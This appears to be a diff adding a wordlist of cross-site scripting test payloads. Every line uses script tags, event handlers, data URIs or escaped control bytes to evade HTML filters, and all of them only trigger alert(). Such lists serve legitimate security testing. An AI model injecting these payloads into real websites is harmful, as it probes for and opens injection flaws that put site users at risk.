@@ -1,0 +1,35 @@
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+';!--\"<XSS>=&{()}
+<body onMouseMove='javascript:alert(1)'></body>
+<body onResize='javascript:alert(1)'></body>
+<object onError='javascript:alert(1)'></object>
+"body onPopState='javascript:alert(1)'></body>
+<html onMouseMove='javascript:alert(1)'></html>
+<applet onreadystatechange='javascript:alert(1)'></applet>
+<body onpagehide='javascript:alert(1)'></body>
+<svg onunload='javascript:alert(1)'></svg>
+<body onMouseMove body onMouseMove="javascript:javascript:alert(1)"></body onMouseMove>
+<body onResize body onResize="javascript:javascript:alert(1)"></body onResize>
+<object onError object onError="javascript:javascript:alert(1)"></object onError>
+<body onPopState body onPopState="javascript:javascript:alert(1)"></body onPopState>
+<html onMouseMove html onMouseMove="javascript:javascript:alert(1)"></html onMouseMove>
+<applet onreadystatechange applet onreadystatechange="javascript:javascript:alert(1)"></applet onreadystatechange>
+<body onpagehide body onpagehide="javascript:javascript:alert(1)"></body onpagehide>
+<svg onunload svg onunload="javascript:javascript:alert(1)"></svg onunload>
+'"><\x3Cscript>javascript:alert(1)</script>
+'"><\x00script>javascript:alert(1)</script>
+"'><\x3Cimg src=xxx:x onerror=javascript:alert(1)>
+"'><\x00img src=xxx:x onerror=javascript:alert(1)>
+<script src="data:text/plain\x2Cjavascript:alert(1)"></script>
+<script src="data:\xD4\x8F,javascript:alert(1)"></script>
+<script src="data:\xE0\xA4\x98,javascript:alert(1)"></script>
+<script src="data:\xCB\x8F,javascript:alert(1)"></script>
+<script\x20type="text/javascript">javascript:alert(1);</script>
+<script\x3Etype="text/javascript">javascript:alert(1);</script>
+<script\x0Dtype="text/javascript">javascript:alert(1);</script>
+<script\x09type="text/javascript">javascript:alert(1);</script>
+<script\x0Ctype="text/javascript">javascript:alert(1);</script>
+<script\x2Ftype="text/javascript">javascript:alert(1);</script>
+<script\x0Atype="text/javascript">javascript:alert(1);</script>
